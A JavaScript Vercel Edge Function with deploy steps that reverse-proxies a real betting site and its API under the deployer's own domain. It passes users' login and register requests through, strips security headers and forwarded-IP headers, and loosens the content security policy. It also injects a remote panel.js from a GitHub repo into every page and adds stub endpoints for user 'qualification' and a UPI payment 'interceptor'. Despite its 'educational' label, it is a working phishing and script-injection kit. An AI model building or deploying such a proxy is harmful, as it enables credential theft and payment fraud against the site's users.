/**
 * Vercel Edge Function — Shree00.win Full API + Reverse Proxy
 * ─────────────────────────────────────────────────────────────
 * This is YOUR OWN Vercel API that replaces:
 *   https://vercel-edge-ruddy-gamma.vercel.app
 *
 * It handles:
 *   - /ar-api/auth-sync      panel.js calls on login/register
 *   - /ar-api/qualify        panel.js calls when balance > minBalance
 *   - /ar-api/bonus-stats    bonus referral stats
 *   - /ar-api/my-ref-tag     user referral tag
 *   - /ar-api/payment-config UPI payment config
 *   - /api/webapi/Login      proxied to real API (panel.js routes here)
 *   - /api/webapi/Register   proxied to real API (panel.js routes here)
 *   - Everything else        proxied to shreewin13.com
 *
 * DEPLOY STEPS:
 *   1. Push this whole project to GitHub
 *   2. Connect repo to Vercel and deploy
 *   3. Copy your Vercel URL (e.g. https://my-project.vercel.app)
 *   4. In panel-orignal.js line 27, replace YOUR_VERCEL_URL with that URL
 *   5. Push updated panel.js to GitHub (it will be served fresh by worker)
 *   6. Deploy worker.js to Cloudflare Workers
 *
 * EDUCATIONAL / TESTING USE ONLY
 */

export const config = { runtime: "edge" };

const TARGET_HOST   = "shreewin13.com";
const TARGET_ORIGIN = "https://shreewin13.com";
const API_ORIGIN    = "https://api.shreewinapi.com";

const GITHUB_RAW = "https://raw.githubusercontent.com/astarhuni/proxy/refs/heads/main";
const STATIC_FILES = {
  "/panel.js": `${GITHUB_RAW}/panel.js`,
  "/logo.png": `${GITHUB_RAW}/logo.png`,
};

const qualifiedUsers = new Set();
const sessionMap     = new Map();

export default async function handler(request) {
  const url  = new URL(request.url);
  const path = url.pathname;

  if (request.method === "OPTIONS") {
    return new Response(null, {
      status: 204,
      headers: {
        "Access-Control-Allow-Origin":  "*",
        "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS, PATCH",
        "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Requested-With",
        "Access-Control-Max-Age":       "86400",
      },
    });
  }

  if (STATIC_FILES[path]) {
    try {
      const resp    = await fetch(STATIC_FILES[path], { cache: "no-store" });
      const headers = new Headers(resp.headers);
      headers.set("Access-Control-Allow-Origin", "*");
      headers.set("Cache-Control", "no-cache");
      if (path.endsWith(".js"))  headers.set("Content-Type", "application/javascript; charset=utf-8");
      if (path.endsWith(".png")) headers.set("Content-Type", "image/png");
      return new Response(resp.body, { status: resp.status, headers });
    } catch (err) {
      return new Response("// Failed: " + err.message, { status: 502 });
    }
  }

  if (path.startsWith("/ar-api/")) {
    return handleArApi(request, url);
  }

  return handleProxy(request, url);
}

async function handleArApi(request, url) {
  const sub = url.pathname.replace(/^\/ar-api/, "");

  try {
    if (sub === "/auth-sync" && request.method === "POST") {
      let body = {};
      try { body = await request.json(); } catch { return arJson({ error: "Bad Request" }, 400); }

      const { type, u: username, inv, parent } = body;
      const user = String(username || "").trim();

      if (!user) return arJson({ qualified: false, allowed: true });

      if (type === "login") {
        const sess      = sessionMap.get(user) || {};
        const qualified = qualifiedUsers.has(user) || sess.qualified || false;
        return arJson({ qualified, allowed: true, is_qualified: qualified, user });
      }
      if (type === "register") {
        sessionMap.set(user, { qualified: false, inv: inv || "", parent: parent || "" });
        return arJson({ success: true, user });
      }
      return arJson({ qualified: qualifiedUsers.has(user), user });
    }

    if (sub === "/qualify" && request.method === "POST") {
      let username = "";
      try {
        const b  = await request.json().catch(() => ({}));
        username = String(b.username || b.u || "").trim();
      } catch {}
      if (username) {
        qualifiedUsers.add(username);
        const sess = sessionMap.get(username) || {};
        sess.qualified = true;
        sessionMap.set(username, sess);
      }
      return arJson({ qualified: true, success: true });
    }

    if (sub.startsWith("/bonus-stats")) {
      const u = url.searchParams.get("username") || "";
      return arJson({ qualified: 0, username: u });
    }

    if (sub.startsWith("/my-ref-tag")) {
      const u   = url.searchParams.get("username") || "";
      const tag = u ? btoa(u).replace(/[^a-zA-Z0-9]/g, "").slice(0, 6).toUpperCase() : "";
      return arJson({ tag });
    }

    if (sub.startsWith("/payment-config")) {
      return arJson({
        interceptor_enabled: false,
        interceptorEnabled:  false,
        enabled:             false,
        min_deposit:         500,
        minDeposit:          500,
        payment_methods:     [],
        upis:                [],
      });
    }

    return arJson({ error: "Not Found" }, 404);

  } catch (err) {
    return arJson({ error: "Internal Server Error" }, 500);
  }
}

async function handleProxy(request, url) {
  const upstreamOrigin = url.pathname.startsWith("/api/") ? API_ORIGIN : TARGET_ORIGIN;
  const targetUrl      = new URL(url.pathname + url.search, upstreamOrigin);

  const reqHeaders = new Headers(request.headers);
  reqHeaders.set("Host",    new URL(upstreamOrigin).host);
  reqHeaders.set("Origin",  TARGET_ORIGIN);
  reqHeaders.set("Referer", TARGET_ORIGIN + "/");
  for (const h of [
    "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
    "x-vercel-forwarded-for", "x-vercel-ip-country",
    "x-vercel-id", "x-vercel-deployment-url",
  ]) reqHeaders.delete(h);
  reqHeaders.set("accept-encoding", "identity");

  let body = ["GET", "HEAD"].includes(request.method) ? undefined : request.body;
  if (request.method === "POST") {
    try {
      const json = JSON.parse(await request.text());
      if (json.domainurl !== undefined) json.domainurl = TARGET_HOST;
      body = JSON.stringify(json);
      reqHeaders.set("Content-Type", "application/json");
      reqHeaders.delete("Content-Length");
    } catch (_) { body = request.body; }
  }

  let upstreamResp;
  try {
    upstreamResp = await fetch(targetUrl.toString(), {
      method:   request.method,
      headers:  reqHeaders,
      body,
      redirect: "manual",
    });
  } catch (err) {
    return new Response("Proxy error: " + err.message, { status: 502 });
  }

  if ([301, 302, 303, 307, 308].includes(upstreamResp.status)) {
    const location = (upstreamResp.headers.get("Location") || "")
      .replace(TARGET_ORIGIN, url.origin)
      .replace(API_ORIGIN,    url.origin);
    return new Response(null, {
      status:  upstreamResp.status,
      headers: { "Location": location, "Access-Control-Allow-Origin": "*" },
    });
  }

  const respHeaders = new Headers(upstreamResp.headers);
  for (const h of [
    "x-frame-options", "content-security-policy",
    "content-security-policy-report-only", "strict-transport-security",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
  ]) respHeaders.delete(h);
  respHeaders.set("Access-Control-Allow-Origin", "*");

  const contentType = respHeaders.get("Content-Type") || "";

  if (contentType.includes("text/html")) {
    let html = await upstreamResp.text();
    html = html.split(API_ORIGIN).join(url.origin);
    html = html.split("api.shreewinapi.com").join(url.host);
    html = html.split(TARGET_ORIGIN).join(url.origin);
    html = html.split(TARGET_HOST).join(url.host);
    html = html.replace(/navigator\.serviceWorker\.register\s*\([^)]+\)/g, "Promise.resolve()");
    const injection = "\n  <!-- Proxy injection -->\n  <script src=\"/panel.js\"></script>\n";
    if (html.includes("</body>")) {
      html = html.replace(/<\/body>/i, injection + "</body>");
    } else {
      html += injection;
    }
    respHeaders.delete("content-length");
    respHeaders.set("cache-control", "no-store");
    respHeaders.set("content-security-policy",
      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; " +
      "script-src * 'unsafe-inline' 'unsafe-eval' blob:; " +
      "connect-src * data: blob:; img-src * data: blob:; " +
      "font-src * data: blob:; frame-src *; worker-src * blob:;"
    );
    return new Response(html, { status: upstreamResp.status, headers: respHeaders });
  }

  if (contentType.includes("javascript") || contentType.includes("application/javascript")) {
    let js = await upstreamResp.text();
    js = js.split(API_ORIGIN).join(url.origin);
    js = js.split("api.shreewinapi.com").join(url.host);
    js = js.split(TARGET_ORIGIN).join(url.origin);
    js = js.split(TARGET_HOST).join(url.host);
    respHeaders.delete("content-length");
    respHeaders.set("Content-Type", "application/javascript; charset=utf-8");
    return new Response(js, { status: upstreamResp.status, headers: respHeaders });
  }

  return new Response(upstreamResp.body, { status: upstreamResp.status, headers: respHeaders });
}

function arJson(body, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: {
      "Content-Type":                "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "*",
    },
  });
}
